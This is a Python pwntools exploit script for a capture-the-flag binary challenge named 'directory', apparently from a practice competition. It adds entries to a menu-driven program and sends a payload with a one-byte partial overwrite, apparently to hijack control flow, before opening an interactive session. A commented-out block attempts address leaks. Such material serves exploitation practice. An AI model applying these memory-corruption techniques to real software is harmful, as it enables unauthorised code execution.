from pwn import *
from icecream import ic

exe = ELF("./directory_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("directory.chal.cyberjousting.com", 1349)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001393
pie b 0x0000000000001471
pie b 0x0000000000001535
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

def add(name):
    sla(b"> ", b"1")
    sa(b"Enter name: \n", name)
    
def remove(ind):
    sla(b"> ", b"2")
    sla(b"Enter index: \n", str(ind).encode())

def printd():
    sla(b"> ", b"3")

def exitd():
    sla(b"> ", b"4")

add(b'a'*0x30)
add(b'b'*0x30)
add(b'c'*0x30)
add(b'd'*0x30)
add(b'e'*0x30)
add(b'f'*0x30)

'''
printd()
ru("5. ffffffffffffffffffffffffffffffffffffffffffffffff")
elf.address = u64(rl().strip().ljust(8, b'\x00')) - 0x40
ic(hex(elf.address))

# add(b'g'*0x24)

# printd()
# ru("6. gggggggggggggggggggggggggggggggggggg")
# libc.address = u64(rl().strip().ljust(8, b'\x00')) - 0x24a83c
# ic(hex(libc.address))

# remove(6)'''

add(b'a'*0x30)
add(b'b'*0x30)
add(b'c'*0x30)

payload = b'd'*0x28
payload += b'\x38'
add(payload)

exitd()

i()
